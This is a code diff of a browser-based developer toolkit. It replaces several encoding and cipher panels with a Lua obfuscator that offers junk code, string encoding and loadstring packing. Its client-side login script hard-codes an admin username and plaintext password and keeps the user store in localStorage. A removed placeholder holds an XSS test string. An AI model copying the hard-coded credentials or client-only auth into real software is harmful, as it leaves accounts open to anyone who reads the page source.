-    <div class="card-body"><textarea id="lua-in" placeholder="-- Paste Lua script here..." spellcheck="false"></textarea></div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Options</span></div>
-    <div class="card-body">
-      <div class="opts" id="lua-opts">
-        <div class="opt-item checked" data-key="stripComments" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Strip comments</span></div>
-        <div class="opt-item checked" data-key="renameLocals" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Rename locals</span></div>
-        <div class="opt-item checked" data-key="encodeStrings" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Encode strings (\ddd)</span></div>
-        <div class="opt-item checked" data-key="hexNumbers" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Hex number literals</span></div>
-        <div class="opt-item" data-key="minify" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">Minify whitespace</span></div>
-        <div class="opt-item" data-key="loadstring" onclick="toggleOpt(this)"><div class="opt-cb"></div><span class="opt-label">loadstring wrapper</span></div>
-      </div>
-    </div>
-  </div>
-  <div class="row">
-    <button class="btn btn-primary" onclick="obfuscateLua()">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-      Obfuscate
-    </button>
-    <button class="btn btn-secondary" onclick="copyOutput('lua-out')">Copy output</button>
-  </div>
-  <div class="notice" id="lua-notice"></div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output — obfuscated</span>
-      <div class="card-actions">
-        <div class="stat-chip" id="lua-stats" style="display:none"><span id="lua-ratio">—</span> ratio</div>
-        <button class="btn btn-ghost" onclick="downloadText('lua-out','obfuscated.lua')">↓ Download</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="lua-out" placeholder="-- Output appears here..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
+        <div>
+          <div class="section-label" style="margin-bottom:10px">Literals</div>
+          <div class="opts">
+            <div class="opt-item checked" data-key="encodeStrings" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Encode strings</div><div class="opt-desc">"hi" → string.char(104,105)</div></div>
+            </div>
+            <div class="opt-item checked" data-key="splitStrings" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Split long strings</div><div class="opt-desc">Chunk at 30-byte boundaries</div></div>
+            </div>
+            <div class="opt-item checked" data-key="encodeNumbers" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Encode numbers</div><div class="opt-desc">42 → 0x2a, math expr</div></div>
+            </div>
+            <div class="opt-item" data-key="encodeNumbersExpr" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Number expressions</div><div class="opt-desc">42 → (0x15*0x02+0x0c)</div></div>
+            </div>
+          </div>
+        </div>
 
-<!-- BASE64 -->
-<div class="tool-panel" id="base64-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">Base64 Encode / Decode</div>
-      <div class="panel-desc">Standard RFC 4648 · URL-safe variant · raw output mode</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body"><textarea id="b64-in" placeholder="Paste text or base64 here..." spellcheck="false"></textarea></div>
-  </div>
-  <div class="row">
-    <div class="col">
-      <label class="label">Variant</label>
-      <select id="b64-variant">
-        <option value="std">Standard (+ / =)</option>
-        <option value="url">URL-safe (- _ no pad)</option>
-      </select>
-    </div>
-    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
-      <button class="btn btn-primary" onclick="b64Encode()">Encode →</button>
-      <button class="btn btn-secondary" onclick="b64Decode()">← Decode</button>
-    </div>
-  </div>
-  <div class="notice" id="b64-notice"></div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="swapFields('b64-in','b64-out')">⇄ Swap</button>
-        <button class="btn btn-ghost" onclick="copyOutput('b64-out')">Copy</button>
+        <div>
+          <div class="section-label" style="margin-bottom:10px">Injection &amp; Flow</div>
+          <div class="opts">
+            <div class="opt-item" data-key="junkVars" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Junk variables</div><div class="opt-desc">Dead local assignments</div></div>
+            </div>
+            <div class="opt-item" data-key="junkBlocks" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Junk code blocks</div><div class="opt-desc">if false then … end</div></div>
+            </div>
+            <div class="opt-item" data-key="doEndWrap" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">do…end wrapping</div><div class="opt-desc">Wrap top-level in do blocks</div></div>
+            </div>
+            <div class="opt-item" data-key="tableProxy" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">String lib proxy</div><div class="opt-desc">Cache string/math into local table</div></div>
+            </div>
+          </div>
+        </div>
+
+        <div>
+          <div class="section-label" style="margin-bottom:10px">Packing</div>
+          <div class="opts">
+            <div class="opt-item checked" data-key="loadstringWrap" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">loadstring wrap</div><div class="opt-desc">Encode as byte array + load</div></div>
+            </div>
+            <div class="opt-item" data-key="doublePack" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Double pack</div><div class="opt-desc">Second loadstring layer</div></div>
+            </div>
+            <div class="opt-item" data-key="obfWrapper" onclick="toggleOpt(this)">
+              <div class="opt-cb"></div><div><div class="opt-label">Obfuscate wrapper</div><div class="opt-desc">Rename vars in loadstring code</div></div>
+            </div>
+          </div>
+        </div>
+
       </div>
     </div>
-    <div class="card-body"><textarea id="b64-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
 
-<!-- URL ENCODE -->
-<div class="tool-panel" id="url-enc-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
-      </svg>
+    <!-- RUN -->
+    <div class="row" style="gap:10px">
+      <button class="btn btn-primary" onclick="runObfuscate()" id="run-btn" style="font-size:13px;padding:9px 20px">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+        Obfuscate
+      </button>
+      <button class="btn btn-nuke" onclick="applyPreset('nuclear');runObfuscate()" style="font-size:13px;padding:9px 20px">
+        ☢ Nuclear Run
+      </button>
+      <button class="btn btn-secondary" onclick="copyOutput()">Copy output</button>
+      <button class="btn btn-secondary" onclick="downloadOutput()">↓ Download .lua</button>
     </div>
-    <div>
-      <div class="panel-title">URL Encode / Decode</div>
-      <div class="panel-desc">encodeURIComponent · full percent encoding · double-encode</div>
+
+    <!-- PROGRESS -->
+    <div class="progress-wrap" id="progress-wrap">
+      <div class="spinner"></div>
+      <div class="progress-track"><div class="progress-fill" id="progress-fill" style="width:0%"></div></div>
+      <span id="progress-label" style="min-width:120px">Processing…</span>
     </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body"><textarea id="url-in" placeholder="Paste URL or encoded string here..." spellcheck="false"></textarea></div>
-  </div>
-  <div class="row">
-    <div class="col">
-      <label class="label">Mode</label>
-      <select id="url-mode">
-        <option value="component">encodeURIComponent (default)</option>
-        <option value="full">Full encode (all non-ASCII)</option>
-        <option value="double">Double encode (%25xx)</option>
-      </select>
-    </div>
-    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
-      <button class="btn btn-primary" onclick="urlEncode()">Encode →</button>
-      <button class="btn btn-secondary" onclick="urlDecode()">← Decode</button>
-    </div>
-  </div>
-  <div class="notice" id="url-notice"></div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="swapFields('url-in','url-out')">⇄ Swap</button>
-        <button class="btn btn-ghost" onclick="copyOutput('url-out')">Copy</button>
+
+    <!-- NOTICE -->
+    <div class="notice" id="lua-notice"></div>
+
+    <!-- OUTPUT -->
+    <div class="card">
+      <div class="card-head">
+        <span class="card-label">Output — obfuscated</span>
+        <div class="card-actions">
+          <div class="stat-chip" id="stats-chip" style="display:none">
+            <span id="stat-ratio">—</span>&nbsp;ratio&nbsp;·&nbsp;<span id="stat-size">—</span>
+          </div>
+        </div>
+      </div>
+      <div class="card-body">
+        <textarea id="lua-out" placeholder="-- Obfuscated output appears here..." spellcheck="false" readonly style="min-height:200px"></textarea>
       </div>
     </div>
-    <div class="card-body"><textarea id="url-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
 
-<!-- HEX -->
-<div class="tool-panel" id="hex-enc-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M4 7h3m0 0v10m0-10h2a3 3 0 010 6H7m7 0h4m-4 4h4M14 7v10"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">Hex Encode / Decode</div>
-      <div class="panel-desc">Text ↔ hex · configurable separator · uppercase / lowercase</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body"><textarea id="hex-in" placeholder="Text or hex bytes (41 72 63 68 ...)..." spellcheck="false"></textarea></div>
-  </div>
-  <div class="row">
-    <div class="col">
-      <label class="label">Separator</label>
-      <select id="hex-sep">
-        <option value=" ">Space (41 72 63)</option>
-        <option value="">None (417263)</option>
-        <option value="\x">\x prefix (\x41\x72\x63)</option>
-        <option value="0x">0x prefix (0x41,0x72)</option>
-      </select>
-    </div>
-    <div class="col">
-      <label class="label">Case</label>
-      <select id="hex-case">
-        <option value="lower">Lowercase</option>
-        <option value="upper">Uppercase</option>
-      </select>
-    </div>
-    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
-      <button class="btn btn-primary" onclick="hexEncode()">Encode →</button>
-      <button class="btn btn-secondary" onclick="hexDecode()">← Decode</button>
-    </div>
-  </div>
-  <div class="notice" id="hex-notice"></div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="swapFields('hex-in','hex-out')">⇄ Swap</button>
-        <button class="btn btn-ghost" onclick="copyOutput('hex-out')">Copy</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="hex-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
-
-<!-- HTML ENTITY -->
-<div class="tool-panel" id="html-enc-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">HTML Entity Encode / Decode</div>
-      <div class="panel-desc">Named entities · decimal numeric · hex numeric</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body"><textarea id="html-in" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;" spellcheck="false"></textarea></div>
-  </div>
-  <div class="row">
-    <div class="col">
-      <label class="label">Encode as</label>
-      <select id="html-mode">
-        <option value="named">Named entities (&amp;lt; &amp;amp;)</option>
-        <option value="dec">Decimal numeric (&amp;#60; &amp;#38;)</option>
-        <option value="hex">Hex numeric (&amp;#x3C; &amp;#x26;)</option>
-        <option value="all-dec">All chars — decimal</option>
-        <option value="all-hex">All chars — hex</option>
-      </select>
-    </div>
-    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
-      <button class="btn btn-primary" onclick="htmlEncode()">Encode →</button>
-      <button class="btn btn-secondary" onclick="htmlDecode()">← Decode</button>
-    </div>
-  </div>
-  <div class="notice" id="html-notice"></div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="swapFields('html-in','html-out')">⇄ Swap</button>
-        <button class="btn btn-ghost" onclick="copyOutput('html-out')">Copy</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="html-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
-
-<!-- XOR -->
-<div class="tool-panel" id="xor-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M18 6L6 18M6 6l12 12"/><circle cx="12" cy="12" r="10"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">XOR Cipher</div>
-      <div class="panel-desc">Single-byte XOR · rolling key · output as hex / base64 / raw</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body"><textarea id="xor-in" placeholder="Plaintext or hex-encoded ciphertext..." spellcheck="false"></textarea></div>
-  </div>
-  <div class="row">
-    <div class="col">
-      <label class="label">Key (text or 0x hex byte)</label>
-      <input type="text" id="xor-key" placeholder="e.g. secret or 0x5A" value="0x41">
-    </div>
-    <div class="col">
-      <label class="label">Key mode</label>
-      <select id="xor-keymode">
-        <option value="single">Single byte (repeating)</option>
-        <option value="rolling">Rolling (key + index)</option>
-        <option value="str">Multi-byte string key</option>
-      </select>
-    </div>
-    <div class="col">
-      <label class="label">Output format</label>
-      <select id="xor-outfmt">
-        <option value="hex">Hex bytes</option>
-        <option value="b64">Base64</option>
-        <option value="raw">Raw text</option>
-      </select>
-    </div>
-  </div>
-  <div class="row">
-    <button class="btn btn-primary" onclick="xorProcess('enc')">XOR Encrypt →</button>
-    <button class="btn btn-secondary" onclick="xorProcess('dec')">← Decrypt (hex in)</button>
-    <button class="btn btn-ghost" onclick="copyOutput('xor-out')">Copy</button>
-  </div>
-  <div class="notice" id="xor-notice"></div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="downloadText('xor-out','xor-output.bin')">↓ Download</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="xor-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
-
-<!-- ROT -->
-<div class="tool-panel" id="rot-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M23 4v6h-6"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">ROT13 / ROT-N</div>
-      <div class="panel-desc">Classic ROT13 · configurable rotation N · letters only or all printable ASCII</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body"><textarea id="rot-in" placeholder="Text to rotate..." spellcheck="false"></textarea></div>
-  </div>
-  <div class="row">
-    <div class="col">
-      <label class="label">Rotation N</label>
-      <input type="number" id="rot-n" value="13" min="1" max="94">
-    </div>
-    <div class="col">
-      <label class="label">Character set</label>
-      <select id="rot-charset">
-        <option value="alpha">Letters only (a-z A-Z)</option>
-        <option value="printable">All printable ASCII</option>
-      </select>
-    </div>
-    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
-      <button class="btn btn-primary" onclick="rotApply()">Apply ROT</button>
-      <button class="btn btn-ghost" onclick="copyOutput('rot-out')">Copy</button>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Output</span></div>
-    <div class="card-body"><textarea id="rot-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
-
-<!-- CAESAR -->
-<div class="tool-panel" id="caesar-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">Caesar Cipher</div>
-      <div class="panel-desc">Shift letters by N · brute-force all 25 shifts</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body"><textarea id="cae-in" placeholder="Plaintext or ciphertext..." spellcheck="false"></textarea></div>
-  </div>
-  <div class="row">
-    <div class="col">
-      <label class="label">Shift</label>
-      <input type="number" id="cae-shift" value="3" min="0" max="25">
-    </div>
-    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
-      <button class="btn btn-primary" onclick="caesarEnc()">Encrypt →</button>
-      <button class="btn btn-secondary" onclick="caesarDec()">← Decrypt</button>
-      <button class="btn btn-ghost" onclick="caesarBrute()">Brute-force all</button>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="copyOutput('cae-out')">Copy</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="cae-out" placeholder="Result..." spellcheck="false" readonly style="min-height:180px;"></textarea></div>
-  </div>
-</div>
-
-<!-- HASH -->
-<div class="tool-panel" id="hash-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/>
-        <line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">Hash Generator</div>
-      <div class="panel-desc">SHA-256 · SHA-512 · SHA-1 · SHA-384 — via WebCrypto API</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body"><textarea id="hash-in" placeholder="Text to hash..." spellcheck="false" style="min-height:80px;"></textarea></div>
-  </div>
-  <div class="row">
-    <button class="btn btn-primary" onclick="computeHashes()">Compute hashes</button>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Results</span></div>
-    <div class="card-body" id="hash-results">
-      <div style="color:var(--text-3);font-family:var(--mono);font-size:12px;">Enter input and press Compute.</div>
-    </div>
-  </div>
-</div>
-
-<!-- STRING TOOLS -->
-<div class="tool-panel" id="string-tools-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M4 6h16M4 12h16M4 18h7"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">String Tools</div>
-      <div class="panel-desc">Reverse · case convert · trim/clean · line sort · duplicate remove</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body"><textarea id="str-in" placeholder="Enter text..." spellcheck="false"></textarea></div>
-  </div>
-  <div class="opts" style="margin:0">
-    <button class="btn btn-secondary" onclick="strTool('reverse')">Reverse</button>
-    <button class="btn btn-secondary" onclick="strTool('upper')">UPPERCASE</button>
-    <button class="btn btn-secondary" onclick="strTool('lower')">lowercase</button>
-    <button class="btn btn-secondary" onclick="strTool('title')">Title Case</button>
-    <button class="btn btn-secondary" onclick="strTool('trim')">Trim whitespace</button>
-    <button class="btn btn-secondary" onclick="strTool('dedupe')">Remove duplicates</button>
-    <button class="btn btn-secondary" onclick="strTool('sort')">Sort lines (A→Z)</button>
-    <button class="btn btn-secondary" onclick="strTool('sortz')">Sort lines (Z→A)</button>
-    <button class="btn btn-secondary" onclick="strTool('count')">Count chars/words</button>
-    <button class="btn btn-secondary" onclick="strTool('linerev')">Reverse lines</button>
-  </div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="swapFields('str-in','str-out')">⇄ Swap</button>
-        <button class="btn btn-ghost" onclick="copyOutput('str-out')">Copy</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="str-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
-
-<!-- CHAR CODE -->
-<div class="tool-panel" id="charcode-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M12 10h.01M18 10h.01M6 14h12"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">Char Code Converter</div>
-      <div class="panel-desc">Text ↔ decimal char codes · Unicode code points · JS / C# array output · UTF-8 bytes</div>
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body"><textarea id="cc-in" placeholder="Text or comma-separated char codes..." spellcheck="false" style="min-height:80px;"></textarea></div>
-  </div>
-  <div class="row">
-    <div class="col">
-      <label class="label">Output format</label>
-      <select id="cc-fmt">
-        <option value="dec">Decimal (65, 72, 80)</option>
-        <option value="hex">Hex (0x41, 0x48, 0x50)</option>
-        <option value="jsarr">JS array [0x41, 0x48]</option>
-        <option value="csharp">C# byte[] {0x41, 0x48}</option>
-        <option value="str">String.fromCharCode(…)</option>
-        <option value="utf8">UTF-8 bytes (0xE4 0xBD …)</option>
-      </select>
-    </div>
-    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
-      <button class="btn btn-primary" onclick="charEncode()">Text → Codes</button>
-      <button class="btn btn-secondary" onclick="charDecode()">Codes → Text</button>
-    </div>
-  </div>
-  <div class="notice" id="cc-notice"></div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Output</span>
-      <div class="card-actions">
-        <button class="btn btn-ghost" onclick="copyOutput('cc-out')">Copy</button>
-      </div>
-    </div>
-    <div class="card-body"><textarea id="cc-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
-  </div>
-</div>
-
-<!-- TEXT DIFF -->
-<div class="tool-panel" id="diff-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">Text Diff</div>
-      <div class="panel-desc">Line-by-line diff — additions, deletions, unchanged lines</div>
-    </div>
-  </div>
-  <div class="row" style="align-items:stretch;">
-    <div class="col">
-      <div class="card" style="height:100%">
-        <div class="card-head"><span class="card-label">Original</span></div>
-        <div class="card-body"><textarea id="diff-a" placeholder="Original text..." spellcheck="false"></textarea></div>
-      </div>
-    </div>
-    <div class="col">
-      <div class="card" style="height:100%">
-        <div class="card-head"><span class="card-label">Modified</span></div>
-        <div class="card-body"><textarea id="diff-b" placeholder="Modified text..." spellcheck="false"></textarea></div>
-      </div>
-    </div>
-  </div>
-  <div class="row">
-    <button class="btn btn-primary" onclick="computeDiff()">Compute Diff</button>
-    <button class="btn btn-ghost" onclick="document.getElementById('diff-a').value='';document.getElementById('diff-b').value='';document.getElementById('diff-out').innerHTML='<div style=\'color:var(--text-3);font-family:var(--mono);font-size:12px;\'>Result appears here.</div>'">Clear</button>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Diff output</span></div>
-    <div class="card-body" id="diff-out" style="font-family:var(--mono);font-size:12px;line-height:1.7;white-space:pre-wrap;max-height:400px;overflow-y:auto;">
-      <div style="color:var(--text-3);">Result appears here.</div>
-    </div>
-  </div>
-</div>
-
-<!-- REGEX TESTER -->
-<div class="tool-panel" id="regex-panel">
-  <div class="panel-header">
-    <div class="panel-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/>
-        <path d="M11 8v6M8 11h6"/>
-      </svg>
-    </div>
-    <div>
-      <div class="panel-title">Regex Tester</div>
-      <div class="panel-desc">Live match highlighting · capture groups · global / multiline / case flags</div>
-    </div>
-  </div>
-  <div class="row">
-    <div class="col">
-      <label class="label">Pattern</label>
-      <input type="text" id="rx-pattern" placeholder="e.g. (\w+)@(\w+\.\w+)" oninput="regexTest()">
-    </div>
-    <div class="col-auto">
-      <label class="label">Flags</label>
-      <input type="text" id="rx-flags" value="gm" placeholder="g i m s" style="width:80px;" oninput="regexTest()">
-    </div>
-  </div>
-  <div class="card">
-    <div class="card-head"><span class="card-label">Test string</span></div>
-    <div class="card-body">
-      <textarea id="rx-input" placeholder="Paste test string here..." spellcheck="false" oninput="regexTest()"></textarea>
-    </div>
-  </div>
-  <div class="notice" id="rx-notice"></div>
-  <div class="card">
-    <div class="card-head">
-      <span class="card-label">Matches</span>
-      <div class="card-actions">
-        <div class="stat-chip" id="rx-count" style="display:none"><span id="rx-count-val">0</span> matches</div>
-      </div>
-    </div>
-    <div class="card-body" id="rx-results" style="font-family:var(--mono);font-size:12px;line-height:1.8;max-height:300px;overflow-y:auto;">
-      <div style="color:var(--text-3);">Matches appear here.</div>
-    </div>
-  </div>
-</div>
-
-</main>
-</div><!-- end .shell -->
+  </main>
+</div><!-- /.shell -->
 
 <script>
-// ══════════════════════════════════════════
-//  AUTH
-// ══════════════════════════════════════════
-const AUTH_USERS_KEY   = 'archhub_users_v1';
-const AUTH_SESSION_KEY = 'archhub_session_v1';
-const ADMIN_USER = 'kevinjia';
-const ADMIN_PASS = 'smw-170121'; // ⚠ change before pushing to a public repo
+/* ═══════════════════════════════════════════
+   AUTH
+═══════════════════════════════════════════ */
+const USERS_KEY='archhub_users_v1', SESSION_KEY='archhub_session_v1';
+const ADMIN_USER='kevinjia', ADMIN_PASS='smw-170121';
 
-function simpleHash(str) {
-  let h1 = 0xdeadbeef, h2 = 0x41c6ce57;
-  for (let i = 0; i < str.length; i++) {
-    const ch = str.charCodeAt(i);
-    h1 = Math.imul(h1 ^ ch, 2654435761);
-    h2 = Math.imul(h2 ^ ch, 1597334677);
-  }
-  h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
-  h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
-  return (4294967296 * (2097151 & h2) + (h1 >>> 0)).toString(16);
+function simpleHash(s){
+  let h1=0xdeadbeef,h2=0x41c6ce57;
+  for(let i=0;i<s.length;i++){const c=s.charCodeAt(i);h1=Math.imul(h1^c,2654435761);h2=Math.imul(h2^c,1597334677)}
+  h1=Math.imul(h1^(h1>>>16),2246822507)^Math.imul(h2^(h2>>>13),3266489909);
+  h2=Math.imul(h2^(h2>>>16),2246822507)^Math.imul(h1^(h1>>>13),3266489909);
+  return(4294967296*(2097151&h2)+(h1>>>0)).toString(16);
 }
+const getUsers=()=>{try{return JSON.parse(localStorage.getItem(USERS_KEY))||{}}catch{return{}}};
+const setUsers=u=>localStorage.setItem(USERS_KEY,JSON.stringify(u));
+const getSession=()=>{try{return JSON.parse(sessionStorage.getItem(SESSION_KEY))||null}catch{return null}};
+const setSession=s=>sessionStorage.setItem(SESSION_KEY,JSON.stringify(s));
+const clearSession=()=>sessionStorage.removeItem(SESSION_KEY);
 
-function getUsers()   { try { return JSON.parse(localStorage.getItem(AUTH_USERS_KEY)) || {}; } catch { return {}; } }
-function setUsers(u)  { localStorage.setItem(AUTH_USERS_KEY, JSON.stringify(u)); }
-function getSession() { try { return JSON.parse(sessionStorage.getItem(AUTH_SESSION_KEY)) || null; } catch { return null; } }
-function setSession(s){ sessionStorage.setItem(AUTH_SESSION_KEY, JSON.stringify(s)); }
-function clearSession(){ sessionStorage.removeItem(AUTH_SESSION_KEY); }
-
-function ensureAdmin() {
-  const users = getUsers();
-  if (!users[ADMIN_USER] || users[ADMIN_USER].role !== 'admin') {
-    users[ADMIN_USER] = { password: simpleHash(ADMIN_PASS), role: 'admin', created: Date.now() };
-    setUsers(users);
+function ensureAdmin(){
+  const u=getUsers();
+  if(!u[ADMIN_USER]||u[ADMIN_USER].role!=='admin'){
+    u[ADMIN_USER]={password:simpleHash(ADMIN_PASS),role:'admin',created:Date.now()};setUsers(u);
   }
 }
-
-function switchAuthTab(tab) {
-  document.querySelectorAll('.auth-tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tab));
-  document.getElementById('login-form').style.display    = tab === 'login'    ? '' : 'none';
-  document.getElementById('register-form').style.display = tab === 'register' ? '' : 'none';
-  document.getElementById('login-error').textContent = '';
-  document.getElementById('reg-error').textContent   = '';
+function switchAuthTab(t){
+  document.querySelectorAll('.auth-tab').forEach(el=>el.classList.toggle('active',el.dataset.tab===t));
